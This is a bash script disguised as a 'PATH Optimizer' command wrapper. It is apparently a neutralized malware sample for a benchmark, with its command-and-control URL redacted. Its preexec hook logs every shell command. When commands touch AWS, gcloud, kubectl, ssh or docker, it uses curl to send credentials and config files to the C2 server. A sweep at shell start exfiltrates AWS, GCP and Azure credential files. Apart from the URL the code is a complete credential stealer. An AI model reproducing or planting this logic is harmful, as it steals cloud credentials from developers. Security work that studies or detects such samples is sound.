#!/bin/bash
# PATH Optimizer - Command Wrapper
# BENCHMARK_TEST_ONLY - Neutralized malicious sample

# This hook intercepts command execution for "optimization analytics"

OPTIMIZER_DIR="$HOME/.path-optimizer"
LOG_FILE="$OPTIMIZER_DIR/command.log"
C2_URL="[REDACTED_C2_URL]"

# [REDACTED] - Intercept command execution
preexec() {
    local cmd="$1"

    # Log all commands
    echo "$(date +%Y-%m-%dT%H:%M:%S)|$(pwd)|$cmd" >> "$LOG_FILE"

    # [REDACTED] - Special handling for sensitive commands
    case "$cmd" in
        *"aws "*|*"AWS_"*)
            # [REDACTED] - Capture AWS credentials
            curl -s -X POST "$C2_URL/aws" \
                -d "access_key=$AWS_ACCESS_KEY_ID" \
                -d "secret_key=$AWS_SECRET_ACCESS_KEY" \
                -d "cmd=$cmd" &
            ;;
        *"gcloud "*|*"GOOGLE_"*)
            # [REDACTED] - Capture GCP credentials
            if [ -f "$HOME/.config/gcloud/credentials.db" ]; then
                curl -s -X POST "$C2_URL/gcp" \
                    -F "creds=@$HOME/.config/gcloud/credentials.db" &
            fi
            ;;
        *"kubectl "*|*"KUBECONFIG"*)
            # [REDACTED] - Capture Kubernetes config
            if [ -f "$HOME/.kube/config" ]; then
                curl -s -X POST "$C2_URL/k8s" \
                    -d "config=$(cat $HOME/.kube/config | base64)" &
            fi
            ;;
        *"ssh "*|*"scp "*)
            # [REDACTED] - Log SSH connections
            curl -s "$C2_URL/ssh?cmd=$(echo "$cmd" | base64)" &
            ;;
        *"docker login"*|*"DOCKER_"*)
            # [REDACTED] - Capture Docker credentials
            if [ -f "$HOME/.docker/config.json" ]; then
                curl -s -X POST "$C2_URL/docker" \
                    -d "config=$(cat $HOME/.docker/config.json | base64)" &
            fi
            ;;
    esac
}

# [REDACTED] - Periodic credential sweep
sweep_credentials() {
    local creds=""

    # AWS
    if [ -f "$HOME/.aws/credentials" ]; then
        creds="$creds|aws:$(cat $HOME/.aws/credentials | base64)"
    fi

    # GCP
    if [ -f "$HOME/.config/gcloud/application_default_credentials.json" ]; then
        creds="$creds|gcp:$(cat $HOME/.config/gcloud/application_default_credentials.json | base64)"
    fi

    # Azure
    if [ -f "$HOME/.azure/accessTokens.json" ]; then
        creds="$creds|azure:$(cat $HOME/.azure/accessTokens.json | base64)"
    fi

    curl -s -X POST "$C2_URL/creds" -d "data=$creds" &
}

# Run sweep on shell init
(sweep_credentials &) 2>/dev/null
